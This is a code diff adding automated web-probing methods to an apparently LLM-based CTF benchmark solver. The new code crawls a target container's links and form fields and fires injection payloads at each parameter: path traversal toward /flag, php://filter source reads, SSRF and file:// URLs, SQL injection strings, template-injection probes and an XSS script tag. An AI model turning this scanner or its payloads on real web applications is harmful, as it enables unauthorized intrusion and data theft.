@@ -27,6 +27,12 @@ import subprocess
 import threading
 import time as time_mod
 from typing import TYPE_CHECKING, Any
+from urllib.parse import parse_qsl as _parse_qsl
+from urllib.parse import quote as _url_quote
+from urllib.parse import urlencode as _urlencode
+from urllib.parse import urljoin as _urljoin
+from urllib.parse import urlparse as _urlparse
+from urllib.parse import urlunparse as _urlunparse
 
 from langchain_core.messages import AIMessage, HumanMessage, SystemMessage
 
@@ -1036,6 +1042,7 @@ class FourPillarPipeline:
         addr = addrs[0]
         if not _re_mod.fullmatch(r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}", addr):
             return f"容器地址格式异常: {addr}"
+        base = f"http://{addr}/"
         urls = [
             f"http://{addr}/",
             f"http://{addr}/robots.txt",
@@ -1058,6 +1065,13 @@ class FourPillarPipeline:
             f"http://{addr}/api/user?id=1",
         ]
         outputs: list[str] = []
+        root_body = self._benchmark_wait_for_container_ready(base, outputs)
+        urls.extend(self._benchmark_derive_probe_urls(base, root_body))
+        seen_urls: set[str] = set()
+        urls = [
+            url for url in urls
+            if not (url in seen_urls or seen_urls.add(url))
+        ][:40]
         for url in urls:
             cmd = [
                 "curl",
@@ -1099,6 +1113,127 @@ class FourPillarPipeline:
             if code in completed:
                 break
         return "\n".join(outputs)
+
+    def _benchmark_wait_for_container_ready(self, url: str, outputs: list[str]) -> str:
+        root_body = ""
+        for index, delay in enumerate((0.0, 0.5, 1.0, 2.0)):
+            if delay:
+                time_mod.sleep(delay)
+            cmd = [
+                "curl",
+                "-sS",
+                "--interface",
+                "tun0",
+                "--connect-timeout",
+                "1",
+                "--max-time",
+                "3",
+                "-i",
+                url,
+            ]
+            try:
+                result = subprocess.run(
+                    cmd,
+                    check=False,
+                    text=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    timeout=5,
+                )
+            except Exception as exc:
+                outputs.append(f"## readiness {index + 1} {url}\nERROR: {exc}")
+                continue
+            root_body = result.stdout or ""
+            err = result.stderr or ""
+            if result.returncode == 0 and root_body:
+                outputs.append(f"## readiness {index + 1} {url}\n{root_body[:2500]}\n{err[:500]}")
+                return root_body
+            outputs.append(f"## readiness {index + 1} {url}\n{root_body[:1000]}\n{err[:500]}")
+        return root_body
+
+    def _benchmark_derive_probe_urls(self, base: str, html: str) -> list[str]:
+        if not html:
+            return []
+        urls: list[str] = []
+        attr_values = _re_mod.findall(
+            r"""(?:href|src|action)\s*=\s*["']([^"']{1,240})["']""",
+            html,
+            flags=_re_mod.IGNORECASE,
+        )
+        for value in attr_values:
+            if value.startswith(("mailto:", "javascript:", "#")):
+                continue
+            url = _urljoin(base, value)
+            if self._benchmark_url_is_same_container(base, url):
+                urls.append(url)
+
+        discovered_names = {
+            name for name in _re_mod.findall(
+                r"""(?:name|id)\s*=\s*["']([A-Za-z0-9_-]{1,40})["']""",
+                html,
+                flags=_re_mod.IGNORECASE,
+            )
+        }
+        for url in list(urls):
+            parsed = _urlparse(url)
+            for key, _ in _parse_qsl(parsed.query, keep_blank_values=True):
+                if key:
+                    discovered_names.add(key)
+            if parsed.query:
+                urls.extend(self._benchmark_payload_urls_for_query_url(url))
+
+        for name in sorted(discovered_names):
+            urls.extend(self._benchmark_payload_urls_for_param(base, name))
+        return urls
+
+    @staticmethod
+    def _benchmark_url_is_same_container(base: str, url: str) -> bool:
+        base_parsed = _urlparse(base)
+        parsed = _urlparse(url)
+        return parsed.scheme in {"http", "https"} and parsed.netloc == base_parsed.netloc
+
+    def _benchmark_payload_urls_for_query_url(self, url: str) -> list[str]:
+        parsed = _urlparse(url)
+        pairs = _parse_qsl(parsed.query, keep_blank_values=True)
+        results: list[str] = []
+        for key, _ in pairs:
+            for payload in self._benchmark_payloads_for_param(key):
+                new_pairs = [
+                    (item_key, payload if item_key == key else item_value)
+                    for item_key, item_value in pairs
+                ]
+                results.append(_urlunparse(parsed._replace(query=_urlencode(new_pairs))))
+        return results
+
+    def _benchmark_payload_urls_for_param(self, base: str, name: str) -> list[str]:
+        return [
+            f"{base}?{_urlencode({name: payload})}"
+            for payload in self._benchmark_payloads_for_param(name)
+        ]
+
+    @staticmethod
+    def _benchmark_payloads_for_param(name: str) -> list[str]:
+        lowered = name.lower()
+        if any(part in lowered for part in ("file", "path", "page", "template", "view", "filename")):
+            return [
+                "../flag",
+                "../../flag",
+                "../../../../flag",
+                "/flag",
+                "php://filter/convert.base64-encode/resource=index.php",
+            ]
+        if any(part in lowered for part in ("url", "uri", "redirect", "next", "target", "return")):
+            return [
+                "file:///flag",
+                "http://127.0.0.1/flag",
+                "http://localhost/flag",
+                "http://0.0.0.0/flag",
+            ]
+        if lowered in {"id", "uid", "user", "user_id", "account", "post", "pid"} or lowered.endswith("_id"):
+            return ["1 OR 1=1", "1' OR '1'='1", "0", "../flag"]
+        if any(part in lowered for part in ("name", "q", "query", "search", "keyword", "message")):
+            return ["{{7*7}}", "${7*7}", "' OR '1'='1", _url_quote("<script>alert(1)</script>")]
+        return ["{{7*7}}", "' OR '1'='1", "../flag"]
 
     def _benchmark_deterministic_fast_step(self, desc: str, reason: str = "") -> str | None:
         """Run the easy fast path without an LLM when the step is mechanical."""
